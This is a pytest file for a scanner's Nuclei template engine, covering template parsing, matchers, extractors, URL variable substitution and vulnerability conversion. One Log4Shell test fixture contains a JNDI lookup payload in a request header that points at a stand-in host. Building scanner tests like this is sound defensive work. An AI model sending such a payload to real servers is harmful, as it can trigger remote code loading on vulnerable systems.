"""Tests for Phase 20 — Nuclei Template Engine Integration.

Covers: TemplateParser, TemplateRunner, TemplateManager, variable substitution,
matcher evaluation, extractor logic, and vulnerability conversion.
"""
from unittest.mock import MagicMock, patch


from apps.scanning.engine.nuclei.template_parser import (
    NucleiTemplate,
    TemplateExtractor,
    TemplateInfo,
    TemplateMatcher,
    TemplateParser,
    TemplateRequest,
    substitute_variables,
)
from apps.scanning.engine.nuclei.template_runner import TemplateRunner
from apps.scanning.engine.nuclei.template_manager import (
    SCAN_PROFILES,
    TAG_CATEGORIES,
    TemplateIndex,
    TemplateManager,
)


# ── Helpers ───────────────────────────────────────────────────────────

def _make_response(status=200, body='', headers=None, content=None):
    """Build a mock requests.Response object."""
    resp = MagicMock()
    resp.status_code = status
    resp.text = body
    resp.content = (content or body.encode('utf-8')) if isinstance(body, str) else (content or body)
    resp.headers = headers or {}
    resp.json.return_value = {}
    return resp


def _make_template(
    template_id='test-001',
    name='Test Detection',
    severity='high',
    tags=None,
    matchers=None,
    extractors=None,
    paths=None,
    method='GET',
    cwe='CWE-79',
    cvss=7.5,
    description='Test description',
    reference=None,
):
    """Build a NucleiTemplate for testing."""
    return NucleiTemplate(
        id=template_id,
        info=TemplateInfo(
            name=name,
            severity=severity,
            tags=tags or ['cve', 'high'],
            cwe_id=cwe,
            cvss_score=cvss,
            description=description,
            reference=reference or [],
        ),
        requests=[
            TemplateRequest(
                method=method,
                path=paths or ['{{BaseURL}}/test'],
                matchers=matchers or [],
                extractors=extractors or [],
            ),
        ],
        template_type='http',
    )


# ══════════════════════════════════════════════════════════════════════
# TemplateParser Tests
# ══════════════════════════════════════════════════════════════════════

class TestTemplateParserHTTPTemplate:
    """test_template_parser_http_template — parse a full HTTP template."""

    def test_parse_basic_http(self):
        data = {
            'id': 'CVE-2021-44228',
            'info': {
                'name': 'Log4Shell RCE',
                'severity': 'critical',
                'tags': 'cve,rce,log4j',
                'description': 'Apache Log4j2 RCE',
                'reference': ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228'],
                'author': 'tester',
                'classification': {
                    'cwe-id': 'CWE-502',
                    'cvss-score': 10.0,
                    'cve-id': 'CVE-2021-44228',
                },
            },
            'http': [
                {
                    'method': 'GET',
                    'path': ['{{BaseURL}}'],
                    'headers': {'X-Custom': '${jndi:ldap://evil/a}'},
                    'matchers': [
                        {'type': 'word', 'words': ['jndi'], 'part': 'body'},
                    ],
                }
            ],
        }
        parser = TemplateParser()
        tmpl = parser.parse_dict(data)
        assert tmpl is not None
        assert tmpl.id == 'CVE-2021-44228'
        assert tmpl.info.name == 'Log4Shell RCE'
        assert tmpl.info.severity == 'critical'
        assert 'cve' in tmpl.info.tags
        assert tmpl.info.cwe_id == 'CWE-502'
        assert tmpl.info.cvss_score == 10.0
        assert tmpl.info.cve_id == 'CVE-2021-44228'
        assert len(tmpl.requests) == 1
        assert tmpl.requests[0].method == 'GET'
        assert tmpl.requests[0].headers == {'X-Custom': '${jndi:ldap://evil/a}'}
        assert tmpl.is_valid

    def test_parse_legacy_requests_key(self):
        """Templates with 'requests' key instead of 'http'."""
        data = {
            'id': 'legacy-001',
            'info': {'name': 'Legacy', 'severity': 'low'},
            'requests': [{'method': 'POST', 'path': ['/login'], 'body': 'user=admin'}],
        }
        parser = TemplateParser()
        tmpl = parser.parse_dict(data)
        assert tmpl.is_valid
        assert tmpl.requests[0].method == 'POST'
        assert tmpl.requests[0].body == 'user=admin'

    def test_parse_non_http_template(self):
        """DNS templates should parse but have no http requests."""
        data = {'id': 'dns-001', 'info': {'name': 'DNS Check'}, 'dns': [{}]}
        parser = TemplateParser()
        tmpl = parser.parse_dict(data)
        assert tmpl.template_type == 'dns'
        assert len(tmpl.requests) == 0
        assert not tmpl.is_valid  # No requests → invalid for execution

    def test_parse_invalid_data(self):
        parser = TemplateParser()
        assert parser.parse_dict(None) is None
        assert parser.parse_dict('string') is None


class TestTemplateParserMatchersWord:
    """test_template_parser_matchers_word."""

    def test_word_matcher(self):
        data = {
            'id': 'word-001',
            'info': {'name': 'Word Test'},
            'http': [{
                'path': ['/'],
                'matchers': [{
                    'type': 'word',
                    'words': ['admin', 'password'],
                    'part': 'body',
                    'condition': 'and',
                    'case-insensitive': True,
                }],
            }],
        }
        parser = TemplateParser()
        tmpl = parser.parse_dict(data)
        m = tmpl.requests[0].matchers[0]
        assert m.type == 'word'
        assert m.values == ['admin', 'password']
        assert m.condition == 'and'
        assert m.case_insensitive is True
        assert m.part == 'body'


class TestTemplateParserMatchersRegex:
    """test_template_parser_matchers_regex."""

    def test_regex_matcher(self):
        data = {
            'id': 'regex-001',
            'info': {'name': 'Regex Test'},
            'http': [{
                'path': ['/'],
                'matchers': [{
                    'type': 'regex',
                    'regex': [r'version\s*:\s*[\d.]+', r'api_key=[A-Za-z0-9]+'],
                    'negative': True,
                }],
            }],
        }
        parser = TemplateParser()
        tmpl = parser.parse_dict(data)
        m = tmpl.requests[0].matchers[0]
        assert m.type == 'regex'
        assert len(m.values) == 2
        assert m.negative is True


class TestTemplateParserMatchersStatus:
    """test_template_parser_matchers_status."""

    def test_status_matcher(self):
        data = {
            'id': 'status-001',
            'info': {'name': 'Status Test'},
            'http': [{
                'path': ['/admin'],
                'matchers': [{'type': 'status', 'status': [200, 301]}],
            }],
        }
        parser = TemplateParser()
        tmpl = parser.parse_dict(data)
        m = tmpl.requests[0].matchers[0]
        assert m.type == 'status'
        assert m.values == [200, 301]


class TestTemplateParserExtractors:
    """test_template_parser_extractors."""

    def test_regex_extractor(self):
        data = {
            'id': 'ext-001',
            'info': {'name': 'Extractor Test'},
            'http': [{
                'path': ['/'],
                'matchers': [{'type': 'status', 'status': [200]}],
                'extractors': [{
                    'type': 'regex',
                    'regex': [r'version=(\d+\.\d+)'],
                    'group': 1,
                    'name': 'version',
                }],
            }],
        }
        parser = TemplateParser()
        tmpl = parser.parse_dict(data)
        e = tmpl.requests[0].extractors[0]
        assert e.type == 'regex'
        assert e.group == 1
        assert e.name == 'version'

    def test_kval_extractor(self):
        data = {
            'id': 'ext-002',
            'info': {'name': 'KVal Extractor'},
            'http': [{
                'path': ['/'],
                'matchers': [{'type': 'status', 'status': [200]}],
                'extractors': [{'type': 'kval', 'kval': ['Server', 'X-Powered-By'], 'part': 'header'}],
            }],
        }
        parser = TemplateParser()
        tmpl = parser.parse_dict(data)
        e = tmpl.requests[0].extractors[0]
        assert e.type == 'kval'
        assert e.values == ['Server', 'X-Powered-By']
        assert e.part == 'header'


# ══════════════════════════════════════════════════════════════════════
# Variable Substitution Tests
# ══════════════════════════════════════════════════════════════════════

class TestVariableSubstitution:
    def test_base_url(self):
        assert substitute_variables('{{BaseURL}}/path', 'https://example.com') == 'https://example.com/path'

    def test_host(self):
        result = substitute_variables('Host: {{Host}}', 'https://example.com:8443')
        assert result == 'Host: example.com:8443'

    def test_hostname(self):
        result = substitute_variables('{{Hostname}}', 'https://example.com:8443/api')
        assert result == 'example.com'

    def test_scheme_and_port(self):
        result = substitute_variables('{{Scheme}}://{{Hostname}}:{{Port}}', 'https://example.com:8443/api')
        assert result == 'https://example.com:8443'

    def test_empty_text(self):
        assert substitute_variables('', 'https://example.com') == ''

    def test_no_variables(self):
        assert substitute_variables('plain text', 'https://example.com') == 'plain text'


# ══════════════════════════════════════════════════════════════════════
# TemplateRunner — Matcher Tests
# ══════════════════════════════════════════════════════════════════════

class TestTemplateRunnerMatchFound:
    """test_template_runner_match_found — matchers trigger on positive match."""

    def setup_method(self):
        self.runner = TemplateRunner()

    def test_word_match_body(self):
        matcher = TemplateMatcher(type='word', values=['admin', 'panel'], condition='or')
        response = _make_response(body='Welcome to admin dashboard')
        assert self.runner._evaluate_matchers([matcher], 'or', response) is True

    def test_word_match_and_condition(self):
        matcher = TemplateMatcher(type='word', values=['admin', 'panel'], condition='and')
        response = _make_response(body='admin panel here')
        assert self.runner._evaluate_matchers([matcher], 'and', response) is True

    def test_regex_match(self):
        matcher = TemplateMatcher(type='regex', values=[r'version\s*=\s*\d+'])
        response = _make_response(body='version = 42')
        assert self.runner._evaluate_matchers([matcher], 'or', response) is True

    def test_status_match(self):
        matcher = TemplateMatcher(type='status', values=[200, 301], part='status')
        response = _make_response(status=200)
        assert self.runner._evaluate_matchers([matcher], 'or', response) is True

    def test_case_insensitive_word(self):
        matcher = TemplateMatcher(type='word', values=['ADMIN'], case_insensitive=True)
        response = _make_response(body='admin panel')
        assert self.runner._evaluate_matchers([matcher], 'or', response) is True

    def test_header_part(self):
        matcher = TemplateMatcher(type='word', values=['nginx'], part='header')
        response = _make_response(headers={'Server': 'nginx/1.18'})
        assert self.runner._evaluate_matchers([matcher], 'or', response) is True

    def test_negative_matcher(self):
        """Negative flag inverts match result."""
        matcher = TemplateMatcher(type='word', values=['error'], negative=True)
        response = _make_response(body='all good')
        assert self.runner._evaluate_matchers([matcher], 'or', response) is True

    def test_binary_match(self):
        matcher = TemplateMatcher(type='binary', values=['504b0304'])  # PK header (ZIP)
        response = _make_response(content=b'\x50\x4b\x03\x04rest')
        assert self.runner._evaluate_matchers([matcher], 'or', response) is True


class TestTemplateRunnerNoMatch:
    """test_template_runner_no_match — matchers correctly reject non-matching responses."""

    def setup_method(self):
        self.runner = TemplateRunner()

    def test_word_no_match(self):
        matcher = TemplateMatcher(type='word', values=['secret_key_xyz'])
        response = _make_response(body='hello world')
        assert self.runner._evaluate_matchers([matcher], 'or', response) is False

    def test_status_no_match(self):
        matcher = TemplateMatcher(type='status', values=[403])
        response = _make_response(status=200)
        assert self.runner._evaluate_matchers([matcher], 'or', response) is False

    def test_regex_no_match(self):
        matcher = TemplateMatcher(type='regex', values=[r'version=\d{5,}'])
        response = _make_response(body='version=42')
        assert self.runner._evaluate_matchers([matcher], 'or', response) is False

    def test_empty_matchers(self):
        response = _make_response(body='anything')
        assert self.runner._evaluate_matchers([], 'or', response) is False

    def test_and_condition_partial(self):
        """AND condition fails when only one matcher hits."""
        m1 = TemplateMatcher(type='word', values=['found'])
        m2 = TemplateMatcher(type='word', values=['missing_xyz'])
        response = _make_response(body='found but not the other')
        assert self.runner._evaluate_matchers([m1, m2], 'and', response) is False


# ══════════════════════════════════════════════════════════════════════
# TemplateRunner — Extractor Tests
# ══════════════════════════════════════════════════════════════════════

class TestExtractors:
    def setup_method(self):
        self.runner = TemplateRunner()

    def test_regex_extractor(self):
        ext = TemplateExtractor(type='regex', values=[r'version=(\d+\.\d+)'], group=1)
        response = _make_response(body='app version=3.14 release')
        result = self.runner._run_extractors([ext], response)
        assert '3.14' in result

    def test_kval_extractor_headers(self):
        ext = TemplateExtractor(type='kval', values=['Server'], part='header')
        response = _make_response(headers={'Server': 'Apache/2.4'})
        result = self.runner._run_extractors([ext], response)
        assert 'Apache' in result

    def test_no_extractors_fallback(self):
        response = _make_response(status=200, body='x' * 100)
        result = self.runner._run_extractors([], response)
        assert 'Status: 200' in result


# ══════════════════════════════════════════════════════════════════════
# TemplateRunner — Vulnerability Conversion
# ══════════════════════════════════════════════════════════════════════

class TestTemplateToVulnConversion:
    """test_template_to_vuln_conversion."""

    def test_basic_conversion(self):
        tmpl = _make_template(
            name='Log4Shell RCE',
            severity='critical',
            cwe='CWE-502',
            cvss=10.0,
            tags=['cve', 'rce', 'log4j'],
            reference=['https://example.com/cve-2021-44228'],
        )
        vuln = TemplateRunner._template_to_vuln(tmpl, 'https://target.com/', 'Matched jndi')
        assert vuln['name'] == '[Nuclei] Log4Shell RCE'
        assert vuln['severity'] == 'critical'
        assert vuln['cwe'] == 'CWE-502'
        assert vuln['cvss'] == 10.0
        assert vuln['category'] == 'Cve'
        assert vuln['affected_url'] == 'https://target.com/'
        assert 'Matched jndi' in vuln['evidence']
        assert 'example.com' in vuln['evidence']  # Reference included

    def test_severity_fallback_cvss(self):
        """When cvss_score is 0, use SEVERITY_CVSS map."""
        tmpl = _make_template(severity='medium', cvss=0)
        vuln = TemplateRunner._template_to_vuln(tmpl, 'https://t.com', 'evidence')
        assert vuln['cvss'] == 5.0  # From SEVERITY_CVSS['medium']

    def test_evidence_truncation(self):
        tmpl = _make_template()
        long_evidence = 'x' * 3000
        vuln = TemplateRunner._template_to_vuln(tmpl, 'https://t.com', long_evidence)
        assert len(vuln['evidence']) <= 2000


# ══════════════════════════════════════════════════════════════════════
# TemplateRunner — Sync Execution
# ══════════════════════════════════════════════════════════════════════

class TestTemplateRunnerSync:
    """test_template_runner_sync — end-to-end sync template execution."""

    @patch('apps.scanning.engine.nuclei.template_runner.TemplateRunner._execute_request')
    def test_run_template_match(self, mock_exec):
        """Template with matching response produces a vulnerability."""
        mock_exec.return_value = _make_response(status=200, body='admin panel found')
        tmpl = _make_template(
            matchers=[TemplateMatcher(type='word', values=['admin panel'])],
        )
        runner = TemplateRunner()
        results = runner.run_template_sync(tmpl, 'https://example.com')
        assert len(results) == 1
        assert results[0]['name'] == '[Nuclei] Test Detection'

    @patch('apps.scanning.engine.nuclei.template_runner.TemplateRunner._execute_request')
    def test_run_template_no_match(self, mock_exec):
        """Template with non-matching response produces no results."""
        mock_exec.return_value = _make_response(status=404, body='not found')
        tmpl = _make_template(
            matchers=[TemplateMatcher(type='word', values=['secret_key'])],
        )
        runner = TemplateRunner()
        results = runner.run_template_sync(tmpl, 'https://example.com')
        assert len(results) == 0

    def test_invalid_template_skipped(self):
        """Templates without proper fields are skipped."""
        tmpl = NucleiTemplate()  # Empty = invalid
        runner = TemplateRunner()
        assert runner.run_template_sync(tmpl, 'https://example.com') == []

    def test_dns_template_skipped(self):
        """Non-HTTP templates are skipped by sync runner."""
        tmpl = _make_template()
        tmpl.template_type = 'dns'
        runner = TemplateRunner()
        assert runner.run_template_sync(tmpl, 'https://example.com') == []


# ══════════════════════════════════════════════════════════════════════
# TemplateRunner — Rate Limiting Integration
# ══════════════════════════════════════════════════════════════════════

class TestTemplateRateLimiting:
    """test_template_rate_limiting — rate limiter is called during execution."""

    @patch('apps.scanning.engine.nuclei.template_runner.TemplateRunner._execute_request')
    def test_rate_limiter_called(self, mock_exec):
        mock_exec.return_value = _make_response(status=200, body='match_me')
        mock_limiter = MagicMock()
        tmpl = _make_template(
            matchers=[TemplateMatcher(type='word', values=['match_me'])],
        )
        runner = TemplateRunner(rate_limiter=mock_limiter)
        runner.run_template_sync(tmpl, 'https://example.com')
        mock_limiter.acquire_sync.assert_called()
        mock_limiter.record_response.assert_called()


# ══════════════════════════════════════════════════════════════════════
# TemplateManager Tests
# ══════════════════════════════════════════════════════════════════════

class TestTemplateManagerFilterByTag:
    """test_template_manager_filter_by_tag."""

    def test_filter_by_tags(self):
        mgr = TemplateManager()
        mgr._index = TemplateIndex()
        mgr._index.by_tag['cve'] = {'/a.yaml', '/b.yaml'}
        mgr._index.by_tag['rce'] = {'/b.yaml', '/c.yaml'}
        mgr._index.all_paths = {'/a.yaml', '/b.yaml', '/c.yaml', '/d.yaml'}

        result = mgr.get_templates_by_tags(['cve'])
        assert set(result) == {'/a.yaml', '/b.yaml'}

        # Union of tags
        result = mgr.get_templates_by_tags(['cve', 'rce'])
        assert set(result) == {'/a.yaml', '/b.yaml', '/c.yaml'}

    def test_filter_by_severity(self):
        mgr = TemplateManager()
        mgr._index = TemplateIndex()
        mgr._index.by_severity['critical'] = {'/crit1.yaml', '/crit2.yaml'}
        mgr._index.by_severity['high'] = {'/high1.yaml'}

        result = mgr.get_templates_by_severity(['critical', 'high'])
        assert len(result) == 3

    def test_get_filtered_with_max(self):
        mgr = TemplateManager()
        mgr._index = TemplateIndex()
        mgr._index.by_tag['cve'] = {f'/{i}.yaml' for i in range(100)}
        mgr._index.by_severity['critical'] = {f'/{i}.yaml' for i in range(50)}
        mgr._index.all_paths = {f'/{i}.yaml' for i in range(200)}

        result = mgr.get_filtered_templates(tags=['cve'], severities=['critical'], max_templates=10)
        assert len(result) <= 10


class TestTemplateManagerProfiles:
    """Test scan profile → template mapping."""

    def test_scan_profiles_exist(self):
        assert 'quick' in SCAN_PROFILES
        assert 'standard' in SCAN_PROFILES
        assert 'full' in SCAN_PROFILES

    def test_tag_categories_exist(self):
        assert 'vulnerability' in TAG_CATEGORIES
        assert 'misconfiguration' in TAG_CATEGORIES

    def test_profile_returns_templates(self):
        mgr = TemplateManager()
        mgr._index = TemplateIndex()
        # Populate index with templates matching tags
        for tag in TAG_CATEGORIES.get('vulnerability', []):
            mgr._index.by_tag[tag] = {f'/{tag}_1.yaml'}
        mgr._index.all_paths = {f'/{tag}_1.yaml' for tags in TAG_CATEGORIES.values() for tag in tags}

        result = mgr.get_templates_for_profile('quick')
        # Quick profile uses certain tag categories — should return something
        assert isinstance(result, (set, list))


class TestTemplateManagerIndex:
    """Test TemplateIndex operations."""

    def test_total_count(self):
        idx = TemplateIndex()
        idx.all_paths = {'/a.yaml', '/b.yaml', '/c.yaml'}
        assert idx.total == 3

    def test_empty_index(self):
        idx = TemplateIndex()
        assert idx.total == 0


# ══════════════════════════════════════════════════════════════════════
# TemplateParser — File Parsing
# ══════════════════════════════════════════════════════════════════════

class TestTemplateParserFile:
    """Test parsing from actual YAML files."""

    def test_parse_yaml_file(self, tmp_path):
        yaml_content = """id: test-file-parse
info:
  name: File Parse Test
  severity: medium
  tags: test,file
http:
  - method: GET
    path:
      - "{{BaseURL}}/test"
    matchers:
      - type: word
        words:
          - "success"
"""
        filepath = tmp_path / 'test.yaml'
        filepath.write_text(yaml_content)

        parser = TemplateParser()
        tmpl = parser.parse_file(str(filepath))
        assert tmpl is not None
        assert tmpl.id == 'test-file-parse'
        assert tmpl.info.severity == 'medium'
        assert 'test' in tmpl.info.tags
        assert tmpl.is_valid

    def test_parse_nonexistent_file(self):
        parser = TemplateParser()
        assert parser.parse_file('/nonexistent/path.yaml') is None

    def test_parse_invalid_yaml(self, tmp_path):
        filepath = tmp_path / 'bad.yaml'
        filepath.write_text('{{{{invalid yaml::::')
        parser = TemplateParser()
        assert parser.parse_file(str(filepath)) is None


# ══════════════════════════════════════════════════════════════════════
# TemplateParser — Info Block Edge Cases
# ══════════════════════════════════════════════════════════════════════

class TestTemplateParserInfoEdgeCases:
    def test_tags_as_list(self):
        parser = TemplateParser()
        tmpl = parser.parse_dict({
            'id': 'tag-list',
            'info': {'name': 'Tag List', 'tags': ['a', 'b', 'c']},
            'http': [{'path': ['/']}],
        })
        assert tmpl.info.tags == ['a', 'b', 'c']

    def test_single_reference_string(self):
        parser = TemplateParser()
        tmpl = parser.parse_dict({
            'id': 'ref-str',
            'info': {'name': 'Ref', 'reference': 'https://example.com'},
            'http': [{'path': ['/']}],
        })
        assert tmpl.info.reference == ['https://example.com']

    def test_classification_cwe_as_list(self):
        parser = TemplateParser()
        tmpl = parser.parse_dict({
            'id': 'cwe-list',
            'info': {
                'name': 'CWE List',
                'classification': {'cwe-id': ['CWE-79', 'CWE-80']},
            },
            'http': [{'path': ['/']}],
        })
        assert tmpl.info.cwe_id == 'CWE-79'

    def test_request_options(self):
        parser = TemplateParser()
        tmpl = parser.parse_dict({
            'id': 'opts',
            'info': {'name': 'Options'},
            'http': [{
                'path': ['/redirect'],
                'redirects': True,
                'max-redirects': 5,
                'cookie-reuse': True,
                'matchers-condition': 'and',
                'matchers': [],
            }],
        })
        req = tmpl.requests[0]
        assert req.redirects is True
        assert req.max_redirects == 5
        assert req.cookie_reuse is True
        assert req.matchers_condition == 'and'


# ══════════════════════════════════════════════════════════════════════
# DSL Matcher Tests
# ══════════════════════════════════════════════════════════════════════

class TestDSLMatcher:
    def test_dsl_status_code(self):
        runner = TemplateRunner()
        matcher = TemplateMatcher(type='dsl', values=['status_code == 200'])
        response = _make_response(status=200)
        assert runner._evaluate_matchers([matcher], 'or', response) is True

    def test_dsl_contains_body(self):
        runner = TemplateRunner()
        matcher = TemplateMatcher(type='dsl', values=["contains(body, 'secret')"])
        response = _make_response(body='the secret is here')
        assert runner._evaluate_matchers([matcher], 'or', response) is True

    def test_dsl_no_match(self):
        runner = TemplateRunner()
        matcher = TemplateMatcher(type='dsl', values=['status_code == 500'])
        response = _make_response(status=200)
        assert runner._evaluate_matchers([matcher], 'or', response) is False
